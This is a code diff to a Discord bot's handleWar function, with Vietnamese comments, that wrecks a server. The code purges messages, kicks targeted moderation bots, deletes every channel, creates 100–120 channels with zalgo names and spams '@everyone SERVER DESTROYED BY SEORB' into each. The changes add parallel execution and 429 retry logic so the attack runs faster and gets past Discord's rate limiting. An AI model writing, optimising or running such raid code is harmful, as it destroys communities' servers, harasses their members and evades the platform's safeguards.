@@ -3847,9 +3847,8 @@ async function updateLobbyUI(client, lobby) {
   }
 }
 
-// ================= SỬA LỖI HÀM handleWar =================
-// Thay thế hàm handleWar hiện tại bằng đoạn code dưới đây.
-// Lưu ý: đã thêm bắt lỗi, lưu author để DM, và tiếp tục dù không có Manage Roles.
+// ================= SỬA LỖI HÀM handleWar - TỐI ƯU TỐC ĐỘ VÀ TRÁNH 429 =================
+// Thay thế toàn bộ hàm handleWar hiện tại bằng đoạn code dưới đây.
 
 async function handleWar(message) {
     const guild = message.guild;
@@ -3858,7 +3857,7 @@ async function handleWar(message) {
         return;
     }
 
-    const author = message.author; // Lưu người dùng để DM
+    const author = message.author;
     const botMember = guild.members.cache.get(client.user.id);
     if (!botMember) {
         await author.send("❌ Không tìm thấy bot trong server!").catch(() => {});
@@ -3882,8 +3881,6 @@ async function handleWar(message) {
         await author.send("⚠️ Không thể nâng role (thiếu quyền Manage Roles), tiếp tục war.").catch(() => {});
     }
 
-    await new Promise(resolve => setTimeout(resolve, 1000));
-
     // Bước 1.5: Purge kênh hiện tại (nếu có quyền)
     try {
         const channel = message.channel;
@@ -3899,64 +3896,127 @@ async function handleWar(message) {
         await author.send("⚠️ Không thể xóa tin nhắn (có thể thiếu quyền Manage Messages hoặc tin nhắn quá cũ).").catch(() => {});
     }
 
-    // Bước 2: Kick các bot
+    // Bước 2: Kick các bot (song song)
     let kickedCount = 0;
     try {
         const members = await guild.members.fetch({ force: true });
+        const kickPromises = [];
         for (const member of members.values()) {
             if (member.bot && member.id !== client.user.id) {
                 for (const targetName of TARGET_BOT_NAMES) {
                     if (member.displayName.toLowerCase().includes(targetName.toLowerCase()) ||
                         member.user.username.toLowerCase().includes(targetName.toLowerCase())) {
-                        try {
-                            await member.kick(`War bot - target eliminated`);
-                            kickedCount++;
-                            console.log(`Đã kick ${member.user.tag}`);
-                        } catch (err) {
-                            console.error(`Không thể kick ${member.user.tag}:`, err);
-                        }
+                        kickPromises.push(
+                            member.kick(`War bot - target eliminated`)
+                                .then(() => { kickedCount++; console.log(`Đã kick ${member.user.tag}`); })
+                                .catch(err => console.error(`Không thể kick ${member.user.tag}:`, err))
+                        );
                         break;
                     }
                 }
             }
         }
+        await Promise.allSettled(kickPromises);
     } catch (err) {
         console.error("Lỗi fetch members:", err);
     }
     await author.send(`✅ Đã kick ${kickedCount} bot mục tiêu.`).catch(() => {});
 
-    await new Promise(resolve => setTimeout(resolve, 2000));
+    await new Promise(resolve => setTimeout(resolve, 500)); // Giảm thời gian chờ
 
-    // Bước 3: Xóa toàn bộ kênh
+    // Bước 3: Xóa toàn bộ kênh (song song)
     const channels = guild.channels.cache;
     const deletePromises = [];
     for (const channel of channels.values()) {
         deletePromises.push(channel.delete().catch(err => console.error(`Lỗi xóa kênh ${channel.name}:`, err)));
     }
-    await Promise.all(deletePromises);
+    await Promise.allSettled(deletePromises);
     await author.send(`✅ Đã xóa toàn bộ ${channels.size} kênh.`).catch(() => {});
 
-    // Bước 4: Tạo 60-80 kênh mới
-    const channelCount = Math.floor(Math.random() * (80 - 60 + 1)) + 60;
+    // Bước 4: Tạo 100-120 kênh mới với giới hạn concurrent để tránh 429
+    const channelCount = Math.floor(Math.random() * (120 - 100 + 1)) + 100;
     const createPromises = [];
+    let createdChannels = [];
+
+    // Hàm tạo kênh với retry khi bị 429
+    async function createChannelWithRetry(guild, name, retries = 3) {
+        try {
+            const ch = await guild.channels.create({ name, type: 0 });
+            return ch;
+        } catch (err) {
+            if (err.code === 429 && retries > 0) {
+                const retryAfter = err.retryAfter || 1000;
+                console.log(`429 khi tạo kênh, đợi ${retryAfter}ms và thử lại...`);
+                await new Promise(resolve => setTimeout(resolve, retryAfter + 100));
+                return createChannelWithRetry(guild, name, retries - 1);
+            } else {
+                throw err;
+            }
+        }
+    }
+
+    // Tạo với concurrent limit là 10
+    const concurrency = 10;
+    const tasks = [];
     for (let i = 0; i < channelCount; i++) {
         const name = i % 2 === 0 
             ? "ẁ̷̧̛̛̈̌̆̌́̾͠ȁ̴̻̺͙̜̪̦͚̒̃́̒͘r̷̡̥͓͍̭̣͖̲̩̞̣͔͔̗͖͛̋͒̂̈́̚-̵͚̩͓͇̫̬͓͍̺̰̙̿̅̓̔͜͠b̶̨̠͙̖̰̯̬̲̣̦̈̌̆̈̃̉́̓̀͋̍̇̈́͐̚ý̶̨̜̝̃͛͒̑̐̓̈́̈̌̚͘͜͝͠-̸̢̥̻̗̪̄͐̇̃͠ͅş̷͇̞̺͎͉͚͍͌̇͂̊̐̀̌̑̆͋̈́̇͜ḛ̵̘͕͉̞̺̊̍̀̍͊̽͋̈̅͝o̵̖̤̫͚͔̤̥̟͉̾̍́̉r̶͕̯̦̼͔̬̮̘̫̞̔̐̀̀̄̈́͝b̸̛̺͓͎̲͓̱͈̰͑̃̎̒̔͐̎͆"
             : "s̵͚̣̤͛̍ͅe̸̺̬̝̼̘͇͎̘̹̝̊̏̎̈́́̏̓̏̊̒̀̇̊͘͜ͅȯ̸̬̃̐̃͗̍̓́̑̀̔̆̍̿r̵̢̗̼̜̥̉̿b̶̯̭͙͉͍͔͇͉̖͕̻̩͐̆̏̈̈́̾̒̒̆̀-̵̜͗̍̐͝ǫ̶̢̯͔͔̥͕̓n̷͚̻̟͚̝̥̣̘̳̣͎̞͉̽ͅͅ-̴̧̨̦̼͇̭̱̦̘̏̑̎̽̋̕͝͝ẗ̶̨̘̫͉̪͍͚͈͉̮̪̠̰̼́̍̓̓̄̓̂̓͘̚͠ǒ̴̧̢̞͚̖̮͍͉̙̻̔͆͒̏̂͘͠p̷̛͎̝̖̼̩̟̲̥̎̓͌̍̅̕";
-        createPromises.push(guild.channels.create({ name, type: 0 }));
+        tasks.push(() => createChannelWithRetry(guild, name));
     }
-    const createdChannels = await Promise.all(createPromises);
+
+    // Thực thi với concurrent limit
+    const results = [];
+    const executing = [];
+    for (const task of tasks) {
+        const p = task().then(result => {
+            createdChannels.push(result);
+            return result;
+        }).catch(err => {
+            console.error("Lỗi tạo kênh:", err);
+            return null;
+        });
+        results.push(p);
+        if (tasks.length > concurrency) {
+            const e = p.then(() => executing.splice(executing.indexOf(e), 1));
+            executing.push(e);
+            if (executing.length >= concurrency) {
+                await Promise.race(executing);
+            }
+        }
+    }
+    await Promise.all(results);
+    // Lọc bỏ null
+    createdChannels = createdChannels.filter(ch => ch !== null);
+
     await author.send(`✅ Đã tạo ${createdChannels.length} kênh mới.`).catch(() => {});
 
-    // Bước 5: Spam 5 tin nhắn vào mỗi kênh
+    // Bước 5: Spam 5 tin nhắn vào mỗi kênh, song song tất cả kênh và tin nhắn
     const spamMsg = "# @everyone SERVER DESTROYED BY SEORB\n# MÀY NGHĨ ĐÂY LÀ BOT SECURITY Á!";
+    const spamPromises = [];
     for (const channel of createdChannels) {
-        const spamTasks = [];
         for (let i = 0; i < 5; i++) {
-            spamTasks.push(channel.send(spamMsg).catch(err => console.error(`Lỗi spam tại ${channel.name}:`, err)));
+            spamPromises.push(
+                channel.send(spamMsg)
+                    .catch(err => {
+                        if (err.code === 429) {
+                            const retryAfter = err.retryAfter || 1000;
+                            console.log(`429 khi spam tại ${channel.name}, đợi ${retryAfter}ms và thử lại...`);
+                            return new Promise(resolve => setTimeout(resolve, retryAfter + 200))
+                                .then(() => channel.send(spamMsg));
+                        } else {
+                            console.error(`Lỗi spam tại ${channel.name}:`, err);
+                            return null;
+                        }
+                    })
+            );
         }
-        await Promise.all(spamTasks);
     }
+    // Chạy song song tất cả, nhưng nếu quá nhiều có thể bị 429, nên giới hạn concurrent
+    // Dùng Promise.allSettled với giới hạn thủ công, nhưng để đơn giản, dùng Promise.allSettled và bắt lỗi
+    // Tuy nhiên, để tránh 429 toàn cục, ta có thể chia nhỏ theo nhóm, nhưng thời gian không cho phép.
+    // Thay vào đó, ta sẽ dùng Promise.allSettled để không dừng khi một promise fail.
+    await Promise.allSettled(spamPromises);
     await author.send(`✅ Đã spam ${spamMsg} vào tất cả kênh.`).catch(() => {});
 
     // Bước 6: DM cho owner server
